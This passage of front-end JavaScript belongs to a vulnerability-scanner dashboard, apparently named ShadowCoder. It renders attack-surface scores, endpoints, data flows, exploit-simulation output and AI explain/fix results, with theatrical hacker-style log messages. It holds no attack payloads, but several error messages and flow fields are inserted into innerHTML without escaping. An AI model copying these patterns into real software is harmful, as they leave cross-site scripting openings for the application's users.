    analyzeProjectBtn?.addEventListener('click', async () => {
        const path = projectPathInput.value.trim();
        if (!path) return;

        analyzeProjectBtn.disabled = true;
        analyzeProjectBtn.innerHTML = '<span class="spinner" style="display:inline-block"></span> ANALYZING...';
        
        surfaceBody.innerHTML = '<div class="ai-loading"><span class="ai-pulse"></span> Scanning project structure...</div>';
        endpointsBody.innerHTML = '';
        flowsBody.innerHTML = '';

        try {
            const resp = await fetch('/api/project/analyze', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ project_root: path })
            });
            if (!resp.ok) throw new Error(await resp.text());
            const data = await resp.json();
            currentProjectData = data;
            renderProjectAnalysis(data);
        } catch (e) {
            console.error(e);
            surfaceBody.innerHTML = `<div class="empty-state"><p class="empty-title" style="color:var(--sev-critical)">ANALYSIS ERROR</p><p class="empty-sub">${e.message}</p></div>`;
            currentProjectData = null;
        } finally {
            analyzeProjectBtn.disabled = false;
            analyzeProjectBtn.innerHTML = '<span class="btn-icon">🔍</span> RUN FULL ANALYSIS';
        }
    });

    function renderProjectAnalysis(data) {
        // 1. Surface Score
        const s = data.security_surface;
        const scoreClass = s.attack_surface_score > 70 ? 'high' : s.attack_surface_score > 40 ? 'med' : 'low';
        
        surfaceBody.innerHTML = `
            <div class="surface-stats">
                <div class="surface-score-box">
                    <span class="score-val ${scoreClass}">${s.attack_surface_score}</span>
                    <span class="score-lbl">ATTACK SURFACE SCORE</span>
                </div>
                <div class="mini-stat-grid">
                    <div class="mini-stat"><span class="mini-val">${s.total_endpoints}</span><span class="mini-lbl">ENDPOINTS</span></div>
                    <div class="mini-stat"><span class="mini-val">${s.data_flows}</span><span class="mini-lbl">DATA FLOWS</span></div>
                    <div class="mini-stat"><span class="mini-val">${s.high_risk_endpoints}</span><span class="mini-lbl">HIGH RISK</span></div>
                    <div class="mini-stat"><span class="mini-val">${s.cross_file_taints}</span><span class="mini-lbl">CROSS-FILE</span></div>
                </div>
                <div class="section-divider"></div>
                <p class="section-title">PROJECT METRICS</p>
                <div class="metrics-list">
                    <div class="metric-row"><span>Files Analyzed:</span><span>${data.files_analyzed}</span></div>
                    <div class="metric-row"><span>Total Lines:</span><span>${data.total_lines.toLocaleString()}</span></div>
                    <div class="metric-row"><span>DB Touching:</span><span>${s.db_touching_flows}</span></div>
                    <div class="metric-row"><span>Net Touching:</span><span>${s.network_touching_flows}</span></div>
                </div>
            </div>
        `;

        // 2. Dependencies
        const depsBody = document.getElementById('deps-body');
        const depCountBadge = document.getElementById('dep-count-badge');
        if (depsBody && data.dependencies) {
            depCountBadge.textContent = `${data.files_analyzed} FILES`;
            depsBody.innerHTML = data.dependencies.map(dep => {
                const fileName = dep.source_file.split(/[\\/]/).pop();
                return `
                    <div class="dep-node">
                        <div class="dep-node-header">
                            <span class="dep-file-icon">📄</span>
                            <span class="dep-file-name">${esc(fileName)}</span>
                            ${dep.imported_by.length > 0 ? `<span class="dep-usage-badge">${dep.imported_by.length} refs</span>` : ''}
                        </div>
                        <div class="dep-node-details">
                            ${dep.imports.length > 0 ? `
                                <div class="dep-sub-list">
                                    <span class="dep-sub-label">IMPORTS:</span>
                                    <div class="dep-tags">${dep.imports.map(i => `<span class="dep-tag">${esc(i)}</span>`).join('')}</div>
                                </div>
                            ` : ''}
                            ${dep.exports.length > 0 ? `
                                <div class="dep-sub-list">
                                    <span class="dep-sub-label">EXPORTS:</span>
                                    <div class="dep-tags">${dep.exports.map(e => `<span class="dep-tag export">${esc(e)}</span>`).join('')}</div>
                                </div>
                            ` : ''}
                        </div>
                    </div>
                `;
            }).join('');
        }

        // 3. Endpoints
        if (data.endpoints?.length) {
            endpointsBody.innerHTML = data.endpoints.map(ep => `
                <div class="project-item endpoint-card ${ep.risk_score >= 70 ? 'critical' : ep.risk_score >= 40 ? 'high' : ''}">
                    <div class="ep-row">
                        <span class="ep-method ${ep.method}">${ep.method}</span>
                        <span class="ep-path">${esc(ep.path)}</span>
                        <div class="ep-risk-group">
                            <div class="risk-bar-bg"><div class="risk-bar-fill" style="width:${ep.risk_score}%"></div></div>
                            <span class="ep-risk">${ep.risk_score}%</span>
                        </div>
                    </div>
                    <div class="ep-details">
                        <div class="ep-handler-info">
                            <span class="ep-handler-icon">ƒ</span>
                            <code>${esc(ep.handler)}()</code> 
                            <span class="ep-file-link">in ${esc(ep.file.split(/[\\/]/).pop())}:${ep.line}</span>
                        </div>
                        ${ep.params.length > 0 ? `<div class="ep-params">Params: ${ep.params.map(p => `<span class="param-tag">${esc(p)}</span>`).join('')}</div>` : ''}
                        <div class="ep-reasons">
                            ${ep.risk_reasons.map(r => `<div class="ep-reason">${esc(r)}</div>`).join('')}
                        </div>
                        ${ep.calls.length > 0 ? `
                            <div class="ep-calls-trace">
                                <span class="trace-label">INTERNAL CALLS:</span>
                                <div class="trace-list">${ep.calls.map(c => `<span class="trace-call">${esc(c)}</span>`).join(' → ')}</div>
                            </div>
                        ` : ''}
                        <div class="ep-actions" style="display:flex;gap:8px">
                            <button class="btn-simulate-ep" data-file="${esc(ep.file)}" data-path="${esc(ep.path)}">⚡ SIMULATE PROBE</button>
                            <button class="ai-btn project-ai-btn" data-action="explain-ep" data-file="${esc(ep.file)}" data-ep='${JSON.stringify(ep).replace(/'/g,"&#39;")}'>💡 AI EXPLAIN</button>
                            <button class="ai-btn project-ai-btn" data-action="fix-ep" data-file="${esc(ep.file)}" data-ep='${JSON.stringify(ep).replace(/'/g,"&#39;")}'>🔧 AI FIX</button>
                        </div>
                        <div class="ai-result project-ai-result" id="ai-result-ep-${esc(ep.handler)}-${ep.line}"></div>
                    </div>
                </div>
            `).join('');
        } else {
            endpointsBody.innerHTML = '<div class="empty-state"><p class="empty-sub">No API endpoints detected.</p></div>';
        }

        // 4. Flows
        if (data.data_flows?.length) {
            flowsBody.innerHTML = data.data_flows.map(flow => `
                <div class="project-item flow-card">
                    <div class="flow-header">
                        <div class="flow-title-group">
                            <span class="flow-id">${flow.path_id}</span>
                            <span class="flow-desc">${esc(flow.description)}</span>
                        </div>
                        <span class="flow-risk-pill ${flow.risk}">${flow.risk}</span>
                    </div>
                    <div class="flow-timeline">
                        ${flow.stages.map((step, idx) => `
                            <div class="timeline-step">
                                <div class="step-marker">
                                    <div class="step-dot"></div>
                                    ${idx < flow.stages.length - 1 ? '<div class="step-line"></div>' : ''}
                                </div>
                                <div class="step-content">
                                    <span class="step-stage">${step.stage}</span>
                                    <span class="step-detail">${esc(step.detail)}</span>
                                    <span class="step-loc">${esc(step.file.split(/[\\/]/).pop())}:${step.line}</span>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                    <div class="flow-flags-row">
                        <div class="flow-flags">
                            ${flow.involves_db ? '<span class="flow-flag db">DB</span>' : ''}
                            ${flow.involves_network ? '<span class="flow-flag net">NET</span>' : ''}
                            ${flow.involves_file_io ? '<span class="flow-flag file">FILE</span>' : ''}
                        </div>
                        <div style="display:flex;gap:8px">
                            <button class="btn-simulate-flow" data-file="${esc(flow.stages[0].file)}" data-id="${flow.path_id}">▶ SIMULATE FLOW</button>
                            <button class="ai-btn project-ai-btn" data-action="explain-flow" data-file="${esc(flow.stages[0].file)}" data-flow='${JSON.stringify(flow).replace(/'/g,"&#39;")}'>💡 AI EXPLAIN</button>
                            <button class="ai-btn project-ai-btn" data-action="fix-flow" data-file="${esc(flow.stages[0].file)}" data-flow='${JSON.stringify(flow).replace(/'/g,"&#39;")}'>🔧 AI FIX</button>
                        </div>
                    </div>
                    <div class="ai-result project-ai-result" id="ai-result-flow-${flow.path_id}"></div>
                </div>
            `).join('');
        } else {
            flowsBody.innerHTML = '<div class="empty-state"><p class="empty-sub">No complex data flows traced.</p></div>';
        }

        // Bind simulate buttons
        document.querySelectorAll('.btn-simulate-ep').forEach(btn => {
            btn.addEventListener('click', async () => {
                const file = btn.getAttribute('data-file');
                const path = btn.getAttribute('data-path');
                await runProjectSimulation(file, `[PROBE] ${path}`);
            });
        });
        document.querySelectorAll('.btn-simulate-flow').forEach(btn => {
            btn.addEventListener('click', async () => {
                const file = btn.getAttribute('data-file');
                const id = btn.getAttribute('data-id');
                await runProjectSimulation(file, `[FLOW] ${id} EXPLOIT`);
            });
        });

        // Bind AI buttons
        document.querySelectorAll('.project-ai-btn').forEach(btn => {
            btn.addEventListener('click', async () => {
                const action = btn.getAttribute('data-action');
                const filePath = btn.getAttribute('data-file');
                const data = action.includes('-ep') 
                    ? JSON.parse(btn.getAttribute('data-ep'))
                    : JSON.parse(btn.getAttribute('data-flow'));
                await loadProjectAiDetail(action, filePath, data, btn);
            });
        });
    }

    async function loadProjectAiDetail(action, filePath, data, btn) {
        const isEp = action.includes('-ep');
        const isFix = action.startsWith('fix-');
        const resultId = isEp ? `ai-result-ep-${data.handler}-${data.line}` : `ai-result-flow-${data.path_id}`;
        const resultEl = document.getElementById(resultId);
        if (!resultEl) return;

        btn.disabled = true;
        btn.textContent = isFix ? '🔧 Generating...' : '💡 Thinking...';
        resultEl.innerHTML = `<div class="ai-loading"><span class="ai-pulse"></span> Querying AI...</div>`;

        try {
            // 1. Get file content for context
            const fResp = await fetch(`/api/file?path=${encodeURIComponent(filePath)}`);
            const { content } = await fResp.json();
            const lines = content.split('\n');
            const startLine = isEp ? data.line : data.stages[0].line;
            const context = lines.slice(Math.max(0, startLine - 10), startLine + 10).join('\n');

            // 2. Construct a mock vulnerability object for the AI
            const mockVuln = isEp ? {
                vuln_type: `Endpoint Risk: ${data.method} ${data.path}`,
                description: `Potential vulnerability in API handler ${data.handler}(). Risk Reasons: ${data.risk_reasons.join(', ')}`,
                line: data.line,
                cwe: 'N/A',
                owasp: 'A1:2021-Broken Access Control'
            } : {
                vuln_type: `Data Flow Risk: ${data.path_id}`,
                description: `Untrusted data flow from entry point to potential sink. Flow: ${data.description}. Risk Level: ${data.risk}`,
                line: data.stages[0].line,
                cwe: 'N/A',
                owasp: 'A3:2021-Injection'
            };

            const endpoint = isFix ? '/api/ai/fix' : '/api/ai/explain';
            const body = isFix 
                ? { vulnerability: mockVuln, source_code: content }
                : { vulnerability: mockVuln, code_context: context };

            const resp = await fetch(endpoint, {
                method: 'POST', 
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(body)
            });
            const aiData = await resp.json();
            const text = aiData.explanation || aiData.fix || '';
            const aiPowered = aiData.ai_powered;

            resultEl.innerHTML = `
                <div class="ai-result-box ${aiPowered ? 'ai-powered' : 'ai-fallback'}">
                    <div class="ai-result-header">
                        <span>${aiPowered ? '🦙 Llama 3' : '📚 Static'}</span>
                        <span class="ai-action-label">PROJECT ANALYSIS</span>
                    </div>
                    <div class="ai-result-text">${formatAiText(text)}</div>
                </div>
            `;
        } catch (e) {
            resultEl.innerHTML = `<div class="ai-result-box ai-fallback"><div class="ai-result-text">AI unavailable: ${e.message}</div></div>`;
        }
        btn.disabled = false;
        btn.textContent = isFix ? '🔧 AI FIX' : '💡 AI EXPLAIN';
    }

    async function runProjectSimulation(filePath, payload) {
        try {
            const resp = await fetch(`/api/file?path=${encodeURIComponent(filePath)}`);
            if (!resp.ok) throw new Error('Could not load file');
            const { content } = await resp.json();
            
            // Switch terminal to project analysis context if needed (handled by making it global)
            await runSimulationInternal(content, payload);
        } catch (e) {
            alert('Simulation failed: ' + e.message);
        }
    }

    // Refactor runSimulation to be reusable
    async function runSimulationInternal(code, payload) {
        terminalPanel.classList.add('visible');
        terminalOutput.className = 'terminal-output';
        let out = `[${new Date().toISOString()}] SHADOWCODER SANDBOX v2.0\n[*] Project Context: Active\n[*] Injecting: ${payload}\n[*] Tracing execution...\n\n`;
        terminalOutput.textContent = out;

        try {
            const resp = await fetch('/api/simulate', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ source_code: code, payload })
            });
            const data = await resp.json();
            const lines = data.success
                ? [`[+] EXPLOIT TRIGGERED`, `[+] Output:`, '', ...data.output.split('\n'), '', '[!] Root/admin path confirmed']
                : [`[-] Exploit mitigated`, ...data.output.split('\n')];

            for (const line of lines) {
                out += line + '\n';
                terminalOutput.textContent = out;
                await sleep(40);
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            }
            terminalOutput.className = 'terminal-output ' + (data.success ? 'success' : 'failure');
        } catch (e) {
            terminalOutput.textContent += `\n[!] Sandbox error: ${e.message}`;
            terminalOutput.className = 'terminal-output failure';
        }
    }

    // ── Clock ────────────────────────────────────────────────────────────────
    setInterval(() => {
        const el = document.getElementById('sys-clock');
        if (el) el.textContent = new Date().toISOString().slice(11,19) + ' UTC';
    }, 1000);

    // ── AI toggle ────────────────────────────────────────────────────────────
    if (aiToggle) {
        aiToggle.addEventListener('click', () => {
            aiEnabled = !aiEnabled;
            aiToggle.classList.toggle('active', aiEnabled);
            aiToggle.textContent = aiEnabled ? '🤖 AI ON' : '🤖 AI OFF';
        });
    }

    // ── Terminal ─────────────────────────────────────────────────────────────
    terminalClose?.addEventListener('click', () => terminalPanel.classList.remove('visible'));

    // ── Line numbers ─────────────────────────────────────────────────────────
    function updateLineNumbers() {
        const n = codeInput.value.split('\n').length;
        lineNumbers.innerHTML = Array.from({length: n}, (_, i) => `<span>${i+1}</span>`).join('');
    }

    editorContainer?.addEventListener('scroll', () => {
        codeHighlight.scrollTop = editorContainer.scrollTop;
        codeHighlight.scrollLeft = editorContainer.scrollLeft;
        lineNumbers.scrollTop = editorContainer.scrollTop;
    });

    let debounce;

    function updateCode() {
        let text = codeInput.value;
        if (text.endsWith('\n')) text += ' ';
        let html = Prism.highlight(text, Prism.languages.python, 'python');
        
        // Always wrap lines for consistent layout
        html = applyVulnHighlights(html, currentScanData?.findings || []);
        
        codeHighlight.querySelector('code').innerHTML = html;
        updateLineNumbers();
    }

    codeInput.addEventListener('input', () => {
        currentScanData = null;
        vulnBadge.textContent = 'AWAITING SCAN';
        vulnBadge.className = 'badge-issues';
        resetStats();
        clearTimeout(debounce);
        debounce = setTimeout(updateCode, 150);
    });

    updateCode();

    // ── Stats ─────────────────────────────────────────────────────────────────
    function resetStats() {
        ['stat-critical','stat-high','stat-exploitable','stat-time'].forEach(id => {
            const el = document.querySelector(`#${id} .stat-val`);
            if (el) el.textContent = '—';
        });
    }

    function updateStats(data) {
        const f = data.findings || [];
        const crit = document.querySelector('#stat-critical .stat-val');
        const high = document.querySelector('#stat-high .stat-val');
        const expl = document.querySelector('#stat-exploitable .stat-val');
        const time = document.querySelector('#stat-time .stat-val');
        
        if (crit) crit.textContent = f.filter(x => x.severity === 'CRITICAL').length;
        if (high) high.textContent = f.filter(x => x.severity === 'HIGH').length;
        if (expl) expl.textContent = f.filter(x => x.exploitable).length;
        if (time) time.textContent = (data.scan_time_ms || 0) + 'ms';
    }

    // ── Progress bar ──────────────────────────────────────────────────────────
    function setProgress(pct, label) {
        if (!progressWrap) return;
        progressWrap.style.display = 'block';
        progressBar.style.width = pct + '%';
        progressLabel.textContent = label;
        if (pct >= 100) setTimeout(() => { if (progressWrap) progressWrap.style.display = 'none'; }, 1200);
    }

    // ── Hacker Terminal Log ───────────────────────────────────────────────────
    function appendHackerLog(stage, detail = '') {
        terminalPanel.classList.add('visible');
        if (!terminalOutput) return;
        
        let logs = [];
        const ts = new Date().toISOString().slice(11, 19);
        
        if (stage === 'init_scan') {
            terminalOutput.textContent = '';
            logs = [
                `╔══════════════════════════════════════════════════════╗`,
                `║            ⚔ SHADOWCODER INTRUSION ENGINE v3.1       ║`,
                `║           VULNERABILITY & EXPLOIT SYSTEM             ║`,
                `╚══════════════════════════════════════════════════════╝`,
                `[${ts}] [*] INITIALIZING INTRUSION PROBE ENGINE...`,
                `[${ts}] [*] Target context loaded...`,
                `[${ts}] [*] Establishing secure debug sockets to runtime...`
            ];
        } else if (stage === 'ast_parse') {
            logs = [
                `[${ts}] [>] Parsing control flow and AST components...`,
                `[${ts}] [>] Reconstructing data flows and module interfaces...`
            ];
        } else if (stage === 'static') {
            logs = [
                `[${ts}] [>] Running 30+ static security scan rules...`,
                `[${ts}] [>] Testing for command, SQL, and code injection vulnerabilities...`
            ];
        } else if (stage === 'payload_gen') {
            logs = [
                `[${ts}] [>] Generating exploit payload configurations...`,
                `[${ts}] [>] Encoding bypasses for WAF/filter evasion...`
            ];
        } else if (stage === 'simulation') {
            logs = [
                `[${ts}] [*] RUNNING VULNERABILITY FLOW PATH SIMULATION...`,
                `[${ts}] [>] Probing memory boundaries and execution pipelines...`
            ];
        } else if (stage === 'chain') {
            logs = [
                `[${ts}] [!] DECRYPTING MULTI-STEP ATTACK CHAINS...`,
                `[${ts}] [!] Linking: trust bypass -> data leak -> RCE execution...`
            ];
        } else if (stage === 'exploit') {
            logs = [
                `[${ts}] [!] LAUNCHING ACTIVE SANDBOX EXPLOITATION PROBES...`,
                `[${ts}] [+] Executing payloads inside restricted environment...`
            ];
        } else if (stage === 'ai') {
            logs = [
                `[${ts}] [*] Invoking LLM Explanation & Fix Recommendation layer...`
            ];
        } else if (stage === 'report') {
            logs = [
                `[${ts}] [*] Compiling dynamic SARIF, HTML and PDF scan reports...`
            ];
        } else if (stage === 'done') {
            logs = [
                `[${ts}] [+] EXPLOIT CRACKING STAGE COMPLETED.`,
                `[${ts}] [+] System audit results successfully compiled.`
            ];
        } else if (stage === 'error') {
            logs = [
                `[${ts}] [!] CRITICAL INTRUSION ERROR: ${detail}`
            ];
        }
        
        logs.forEach(line => {
            terminalOutput.textContent += line + '\n';
        });
        terminalOutput.scrollTop = terminalOutput.scrollHeight;
    }

    // ── WebSocket scan (Phase 3) ──────────────────────────────────────────────
    scanBtn.addEventListener('click', async () => {
        const code = codeInput.value.trim();
        if (!code) return;

        // Close any existing WS
        if (currentWs) { currentWs.close(); currentWs = null; }

        scanBtn.disabled = true;
        scanSpinner.style.display = 'inline-block';
        btnText.textContent = 'SUBMITTING...';
        setProgress(5, 'Submitting scan job...');

        // Initialize hacker terminal output
        appendHackerLog('init_scan', 'editor.py');
        startCrackingOverlay();

        detailsBody.innerHTML = `
            <div class="empty-state">
                <div class="empty-icon spinning">
                    <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
                        <circle cx="20" cy="20" r="16" stroke="#00ff88" stroke-width="1.5" stroke-dasharray="25 75" stroke-linecap="round"/>
                    </svg>
                </div>
                <p class="empty-title" id="scan-phase">INITIALIZING</p>
                <p class="empty-sub" id="scan-detail">Connecting to engine...</p>
            </div>
        `;

        try {
            // 1. Submit job
            const headers = { 'Content-Type': 'application/json' };
            const token = localStorage.getItem('sc_token');
            if (token) headers['Authorization'] = `Bearer ${token}`;

            const resp = await fetch('/api/scan', {
                method: 'POST',
                headers: headers,
                body: JSON.stringify({ 
                    source_code: code, 
                    filename: 'editor.py', 
                    skip_ai: !aiEnabled,
                    exploit: exploitToggle?.checked || false
                })
            });
            if (!resp.ok) throw new Error(`Submit failed: ${resp.status}`);
            const { job_id, cached } = await resp.json();

            btnText.textContent = 'SCANNING...';

            // 2. Connect WebSocket for real-time progress
            const wsProto = location.protocol === 'https:' ? 'wss:' : 'ws:';
            const ws = new WebSocket(`${wsProto}//${location.host}/ws/${job_id}`);
            currentWs = ws;

            // Heartbeat
            const ping = setInterval(() => { if (ws.readyState === WebSocket.OPEN) ws.send('ping'); }, 15000);

            ws.addEventListener('message', (evt) => {
                const msg = JSON.parse(evt.data);
                handleWsMessage(msg);
            });

            ws.addEventListener('error', () => {
                clearInterval(ping);
                fallbackPoll(job_id);
            });

            ws.addEventListener('close', () => clearInterval(ping));

        } catch (err) {
            console.error(err);
            detailsBody.innerHTML = `<div class="empty-state"><p class="empty-title" style="color:var(--sev-critical)">ERROR</p><p class="empty-sub">${err.message}</p></div>`;
            finishScan();
        }
    });

    function handleWsMessage(msg) {
        switch (msg.type) {
            case 'stage':
                updateStageDisplay(msg);
                setProgress(msg.progress, msg.label);
                appendHackerLog(msg.stage, msg.detail);
                updateCrackingProgress(msg.progress, msg.stage, msg.detail || '');
                break;
            case 'complete':
            case 'cached':
                updateCrackingProgress(100, msg.type === 'cached' ? 'cache' : 'done', 'Scan complete');
                setProgress(100, msg.type === 'cached' ? 'Cache hit!' : 'Scan complete');
                appendHackerLog('done');
                setTimeout(() => {
                    stopCrackingOverlay();
                }, 1000);
                onScanComplete(msg.result, msg.type === 'cached');
                break;
            case 'error':
                setProgress(0, 'Error');
                appendHackerLog('error', msg.error);
                stopCrackingOverlay();
                onScanError(msg.error);
                break;
        }
    }

    function updateStageDisplay(msg) {
        const el = document.getElementById('scan-phase');
        const det = document.getElementById('scan-detail');
        if (el) el.textContent = msg.label?.toUpperCase() || msg.stage.toUpperCase();
        if (det) det.textContent = msg.detail || '';
    }

    async function fallbackPoll(job_id) {
        // Fallback: poll /api/scan/{job_id} if WS fails
        for (let i = 0; i < 60; i++) {
            await sleep(500);
            try {
                const r = await fetch(`/api/scan/${job_id}`);
                const d = await r.json();
                if (d.status === 'COMPLETE' || d.status === 'CACHED') {
                    onScanComplete(d.result, d.status === 'CACHED');
                    return;
                }
                if (d.status === 'FAILED') { onScanError(d.error); return; }
                if (d.stages?.length) {
                    const last = d.stages[d.stages.length - 1];
                    setProgress(last.progress, last.label);
                }
            } catch {}
        }
        onScanError('Scan timed out');
    }
    function onScanComplete(data, fromCache) {
        currentScanData = data;
        updateStats(data);
        updateCode();

        const n = data.vulnerabilities_found || 0;
        if (n === 0) {
            vulnBadge.textContent = '✓ CLEAN';
            vulnBadge.className = 'badge-issues clean';
            detailsBody.innerHTML = `<div class="empty-state"><div class="empty-icon">✅</div><p class="empty-title" style="color:var(--green)">NO VULNERABILITIES</p><p class="empty-sub">Static analysis complete. ${fromCache ? '(from cache)' : ''}</p></div>`;
        } else {
            vulnBadge.textContent = `⚠ ${n} ISSUES`;
            vulnBadge.className = 'badge-issues has-vulns';
            const cacheLabel = fromCache ? ' <span style="color:var(--cyan);font-size:10px">[CACHED]</span>' : '';
            detailsBody.innerHTML = `<div class="empty-state"><p class="empty-title" style="color:var(--sev-critical)">⚠ ${n} VULNERABILITIES${cacheLabel}</p><p class="empty-sub">Click any highlighted line to view attack details.</p></div>`;

            // Auto-load AI triage if enabled
            if (aiEnabled) loadAiTriage(data.findings);
        }
        finishScan();

        // Save to local history
        saveToHistory(data);
    }

    function saveToHistory(result) {
        const history = JSON.parse(localStorage.getItem('sc_history') || '[]');
        history.unshift({
            date: new Date().toISOString(),
            filename: result.target_file || 'stdin',
            vulnerabilities: result.vulnerabilities_found || 0,
            source: codeInput.value
        });
        localStorage.setItem('sc_history', JSON.stringify(history.slice(0, 50)));
    }

    function onScanError(err) {
        detailsBody.innerHTML = `<div class="empty-state"><p class="empty-title" style="color:var(--sev-critical)">SCAN ERROR</p><p class="empty-sub">${err}</p></div>`;
        finishScan();
    }

    function finishScan() {
        scanBtn.disabled = false;
        scanSpinner.style.display = 'none';
        btnText.textContent = 'EXECUTE SCAN';
    }

    // ── Vulnerability highlights ───────────────────────────────────────────────
    function applyVulnHighlights(html, findings = []) {
        let lines = html.split('\n');
        const byLine = {};
        findings.forEach((f, idx) => {
            const ln = f.vulnerability.line - 1;
            if (!byLine[ln]) byLine[ln] = [];
            byLine[ln].push({ ...f, _idx: idx });
        });
        const order = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1 };
        for (let i = 0; i < lines.length; i++) {
            const lineContent = lines[i] || ' ';
            const safeContent = lineContent === ' ' ? '&nbsp;' : lineContent;
            if (byLine[i]) {
                const sev = byLine[i].reduce((a, c) => order[c.severity] > order[a] ? c.severity : a, 'LOW');
                const idx = byLine[i].map(v => v._idx).join(',');
                lines[i] = `<span class="vuln-line severity-${sev}" data-vuln-idx="${idx}">${safeContent}</span>`;
            } else {
                lines[i] = `<span>${safeContent}</span>`;
            }
        }
        return lines.join('');
    }

    // ── Click to select vulnerability ─────────────────────────────────────────
    const handleClick = () => {
        if (!currentScanData?.findings) return;
        const cursor = codeInput.value.substring(0, codeInput.selectionStart);
        const line = cursor.split('\n').length - 1;
        const hits = currentScanData.findings.filter(f => (f.vulnerability.line - 1) === line);
        if (hits.length) renderDetails(hits);
    };
    codeInput.addEventListener('click', handleClick);
    codeInput.addEventListener('keyup', e => {
        if (['ArrowUp','ArrowDown','ArrowLeft','ArrowRight'].includes(e.key)) handleClick();
    });

    // ── Render finding details ────────────────────────────────────────────────
    function esc(s) {
        return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }
    const cvssMap = { CRITICAL: '9.8', HIGH: '7.5', MEDIUM: '5.3', LOW: '3.1' };

    function renderDetails(findings) {
        detailsBody.innerHTML = '';
        findings.forEach(finding => {
            const v = finding.vulnerability;
            const payloads = (finding.payloads || []).slice(0, 3);
            const payloadRaw = payloads[0]?.raw || '';

            let payloadHtml = '';
            if (payloads.length) {
                payloadHtml = `
                    <div class="section-divider"></div>
                    <p class="section-title">⚔ EXPLOIT PAYLOADS (${finding.payloads.length})</p>
                    ${payloads.map(p => `<div class="code-snippet">${esc(p.raw)}</div>`).join('')}
                    ${finding.exploitable ? `<button class="simulate-btn" data-payload="${btoa(unescape(encodeURIComponent(payloadRaw)))}">▶ RUN SANDBOX SIMULATION</button>` : ''}
                `;
            }

            let taintHtml = '';
            const tflow = finding.simulation?.taint_flow || [];
            if (tflow.length) {
                taintHtml = `
                    <div class="section-divider"></div>
                    <p class="section-title">⟶ TAINT PROPAGATION</p>
                    <div class="taint-flow">${tflow.slice(0,5).map(s => `<div class="taint-step">${esc(s)}</div>`).join('')}</div>
                `;
            }

            let chainHtml = '';
            let chainToRender = null;
            if (finding.chain_ids?.length) {
                const chain = currentScanData.attack_chains?.find(c => c.chain_id === finding.chain_ids[0]);
                if (chain) {
                    chainToRender = chain;
                    chainHtml = `
                        <div class="section-divider"></div>
                        <p class="section-title">⛓ ATTACK CHAIN — ${esc(chain.name)}</p>
                        <div id="vis-network-${finding.vulnerability.vuln_id}" style="width: 100%; height: 200px; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 6px; margin-top: 10px;"></div>
                    `;
                }
            }

            let simMeta = '';
            const sim = finding.simulation || {};
            const flags = [];
            if (sim.rce_possible) flags.push(`<span style="color:var(--sev-critical)">RCE</span>`);
            if (sim.data_exfil_possible) flags.push(`<span style="color:var(--sev-high)">DATA EXFIL</span>`);
            if (sim.privilege_escalation) flags.push(`<span style="color:var(--sev-medium)">PRIV ESC</span>`);
            if (sim.blast_radius) flags.push(`<span style="color:var(--cyan)">BLAST: ${sim.blast_radius}</span>`);
            if (flags.length) simMeta = `<div class="sim-flags">${flags.join('')}</div>`;

            detailsBody.insertAdjacentHTML('beforeend', `
                <div class="detail-card">
                    <div class="card-header">
                        <span class="severity-badge ${finding.severity}">${finding.severity}</span>
                        <div style="display:flex;gap:6px;align-items:center">
                            <span style="font-family:var(--font-mono);font-size:9px;color:var(--sev-medium)">CVSS ${cvssMap[finding.severity] || '—'}</span>
                            <span class="id-badge">${esc(v.vuln_id)}</span>
                        </div>
                    </div>
                    <h3 class="detail-title">${esc(v.vuln_type)}</h3>
                    <div class="detail-meta">
                        <span>Line ${v.line}</span><span>${esc(v.cwe)}</span><span>OWASP ${esc(v.owasp)}</span>
                    </div>
                    <p class="section-title">ANALYSIS</p>
                    <p class="detail-text">${esc(v.description)}</p>
                    ${simMeta}
                    ${payloadHtml}
                    ${taintHtml}
                    ${chainHtml}
                    <div class="ai-action-row">
                        <button class="ai-btn" data-action="explain" data-vuln='${JSON.stringify(v).replace(/'/g,"&#39;")}'>💡 Explain</button>
                        <button class="ai-btn" data-action="fix" data-vuln='${JSON.stringify(v).replace(/'/g,"&#39;")}'>🔧 Fix</button>
                    </div>
                    <div class="ai-result" id="ai-result-${v.vuln_id}"></div>
                    ${finding.exploitable ? '<div class="exploit-confirmed">⚠ EXPLOITATION PATH CONFIRMED</div>' : ''}
                    ${finding.simulation?.exploit_confirmed ? `
                        <div class="exploit-confirmed live">
                            <span class="exploit-pulse"></span> LIVE EXPLOIT CONFIRMED
                        </div>
                        <div class="code-snippet exploit-output" title="Exploit Output">
                            <span style="color:var(--text-muted);font-size:9px;display:block;margin-bottom:4px">// SANDBOX OUTPUT</span>
                            ${esc(finding.simulation.exploit_output)}
                        </div>
                    ` : ''}
                </div>
            `);

            // Render Vis.js network if a chain exists
            if (chainToRender && typeof vis !== 'undefined') {
                setTimeout(() => {
                    const container = document.getElementById(`vis-network-${finding.vulnerability.vuln_id}`);
                    if (!container) return;
                    const nodes = new vis.DataSet();
                    const edges = new vis.DataSet();
                    
                    // Split long text with basic manual wrapping (every ~35 chars) for better nodes
                    const wrapText = (t) => t.replace(/(?![^\n]{1,35}$)([^\n]{1,35})\s/g, '$1\n');
                    
                    chainToRender.steps.forEach((s, i) => {
                        nodes.add({
                            id: i,
                            label: esc(wrapText(s)),
                            shape: 'box',
                            color: {
                                background: i === chainToRender.steps.length - 1 ? 'rgba(255,45,85,0.1)' : 'rgba(0,255,136,0.05)',
                                border: i === chainToRender.steps.length - 1 ? '#ff2d55' : 'rgba(0,255,136,0.3)'
                            },
                            font: { color: i === chainToRender.steps.length - 1 ? '#ff2d55' : '#00ff88', face: 'var(--font-mono)', size: 10 },
                            margin: 8,
                            borderWidth: 1,
                        });
                        if (i > 0) {
                            edges.add({ from: i - 1, to: i, arrows: 'to', color: { color: 'rgba(0,255,136,0.2)' } });
                        }
                    });

                    const network = new vis.Network(container, { nodes, edges }, {
                        layout: { hierarchical: { direction: 'UD', sortMethod: 'directed', nodeSpacing: 100, levelSeparation: 60 } },
                        physics: false,
                        interaction: { dragNodes: false, dragView: true, zoomView: true, selectConnectedEdges: false, hover: true }
                    });

                    // Change cursor on hover to indicate clickability
                    network.on("hoverNode", function () {
